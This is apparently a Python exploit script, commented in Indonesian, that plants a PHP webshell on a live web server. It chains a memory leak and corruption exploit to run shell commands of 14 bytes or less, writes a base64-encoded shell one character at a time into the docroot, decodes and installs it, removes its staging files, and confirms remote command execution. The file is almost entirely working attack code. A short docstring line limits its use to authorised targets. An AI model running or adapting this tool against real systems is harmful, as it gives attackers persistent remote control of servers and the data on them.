#!/usr/bin/env python3
"""upshell_live.py — tanam webshell ala LIVE target (tanpa bind-mount curang).

Fakta live (semua terukur di lab 8093, bukan teori):
  - carrier perintah = 14 byte (HTDATA palsu 167 byte)
  - cwd system() = docroot (/var/www/html) — TERBUKTI via pwd>/tmp/zz2
  - docroot docker-php writable oleh www-data
  - WAJIB full-chain per perintah (leak baru tiap cmd) — leak sekali-untuk-
    semua membuahkan alamat stale (worker berganti) -> tidak pernah mengeksekusi.
    (pelajaran A/B: /tmp/zz & /tmp/zz2 tertulis hanya via full-chain per cmd)

Pipeline (masing2 cmd <=14 byte):
  - tulis b64(shell) : N x `echo C>>v`        (1 char/request; v = staging file)
  - dekode           : `base64 -d<v>g` (13)
  - pasang           : `mv g <name>`   (10)
  - bersih2          : `rm v & rm g`
  - verifikasi POST c=id

Shell mini (36 byte): <?php echo shell_exec($_REQUEST[c]);

PAKAI DI TARGET SENDIRI / IZIN TERTULIS. RoE bounty umumnya melarang webshell;
untuk bukti cukup `--proof-file`.
"""
from __future__ import annotations

import argparse
import base64
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from lib import chain as chain_mod  # noqa: E402

MINI_SHELL = b"<?php echo shell_exec($_REQUEST['c']);"


def http_post(url: str, data: dict, timeout: float = 8.0) -> tuple[int, str]:
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")[:300]
    except urllib.error.HTTPError as ex:
        return ex.code, ""
    except Exception as ex:  # noqa: BLE001
        return 0, str(ex)


def full_chain_cmd(base: str, cmd: str, profile: str = "bookworm",
                   attempts: int = 6, log=print) -> bool:
    """Eksekusi 1 perintah (<=14 byte) — leak BARU per perintah, pola run_exploit."""
    assert len(cmd.encode()) <= 14, (len(cmd), cmd)
    for attempt in range(1, attempts + 1):
        try:
            t = chain_mod.Target(base, timeout=30.0, verbose=False)
            t.log = lambda *_: None
            ex = chain_mod.Chain(t, cmd, profile=profile, verbose=False)
            ex.rotate()
            chunk = ex.stage1()
            if not chunk:
                continue
            ex.rotate()
            libphp = ex.stage2()
            if not libphp:
                continue
            ex.rotate()
            ht = chunk + ex.htdata_offset
            zif = libphp + ex.zif_offset
            ex.stage3(ht, zif)
            time.sleep(0.7)
            log(f"     try{attempt} ht=0x{ht & 0xfff:x}+ zif=0x{zif & 0xfff:x} (ok)")
            return True
        except Exception as exc:  # noqa: BLE001
            log(f"     try{attempt}: {type(exc).__name__}: {exc}")
            time.sleep(0.5)
    return False


def http_get(url: str, timeout: float = 8.0) -> tuple[int, str]:
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")[:500]
    except urllib.error.HTTPError as ex:
        return ex.code, ""
    except Exception as ex:  # noqa: BLE001
        return 0, str(ex)


def write_v_verified(base: str, b64: str, args, log=print) -> bool:
    """Tulis b64 ke staging 'v' di docroot DENGAN verifikasi via HTTP GET /v.

    stage3 kadang tak jalan / jalan dobel -> file bisa kekurangan/kelebihan
    char. Karena docroot diserve Apache, isi 'v' bisa dibaca langsung:
    kalau mismatch -> rm v lalu tulis ulang dari char pertama (fallback),
    maks 3 putaran.
    """
    import time as _t

    def run(cmd: str) -> bool:
        return full_chain_cmd(base, cmd, args.profile, log=log)

    for round_ in range(1, 5):
        run("rm v")
        ok_all = True
        for i, ch in enumerate(b64):
            # PENTING (dash): digit SEBELUM '>>' = redirect fd-N ("9 >>v" tetap
            # fd-9 walau berspasi — POSIX izinkan ws). Solusi: QUOTE karakter:
            # "printf '9' >>v" = 14 byte, semua char base64 lolos ('+/=' aman).
            cmd = f"printf '{ch}' >v" if i == 0 else f"printf '{ch}' >>v"
            # verifikasi PER CHAR: stage3 tidak deterministik (~1/12 gagal
            # dieksekusi tanpa error). Tegakkan dengan ulang char yang sama.
            for attempt in range(1, 6):
                if not run(cmd):
                    return False
                _t.sleep(0.4)
                code, cur = http_get(base + "v")
                if code == 200 and cur == b64[:i + 1]:
                    break
                log(f"     char {i + 1}/{len(b64)} ({ch!r}) coba{attempt}: "
                    f"file={len(cur)}B")
                if code == 200 and len(cur) < i + 1 and b64.startswith(cur):
                    continue  # char belum tertulis — ulang command yang sama
                # isi salah/korup -> rm dan rebuild dari awal
                run("rm v")
                return write_v_verified(base, b64, args, log=log)
            else:
                ok_all = False
                break
            if (i + 1) % 12 == 0:
                log(f"     [{i + 1}/{len(b64)}] ok")
        if ok_all:
            code, cur = http_get(base + "v")
            if code == 200 and cur == b64:
                log("     staging 'v' TERVERIFIKASI via HTTP (48/48)")
                return True
    return False


def main() -> int:
    ap = argparse.ArgumentParser(description="up-shell live (full-chain per cmd, verifikasi HTTP)")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--name", default="s3.php", help="nama shell di webroot")
    ap.add_argument("--profile", default="bookworm")
    args = ap.parse_args()

    base = args.url.rstrip("/") + "/"
    log = print
    shell_name = args.name

    b64 = base64.b64encode(MINI_SHELL).decode()
    print(f"[1] tulis staging 'v' ({len(b64)} char, verifikasi tiap 12 char)")
    if not write_v_verified(base, b64, args, log=log):
        print("    staging 'v' gagal terverifikasi setelah 3 putaran")
        return 1

    print("[2] dekode: base64 -d<v>g")
    if not full_chain_cmd(base, "base64 -d<v>g", args.profile, log=log):
        return 2

    print(f"[3] pasang: mv g {shell_name}")
    if not full_chain_cmd(base, f"mv g {shell_name}", args.profile, log=log):
        return 3

    print("[4] bersih-bersih: rm v lalu rm g")
    full_chain_cmd(base, "rm v", args.profile, log=log)
    full_chain_cmd(base, "rm g", args.profile, log=log)

    print("[5] verifikasi …")
    code, body = http_post(base + shell_name, {"c": "id"})
    print(f"    HTTP {code}: {body.strip()[:100]}")
    if code == 200 and "uid=" in body:
        print(f"[+] SHELL AKTIF: {base}{shell_name}")
        print(f"    pakai : POST c=<perintah>")
        return 0
    print("[-] belum aktif — coba run ulang tahap [2]-[3]")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
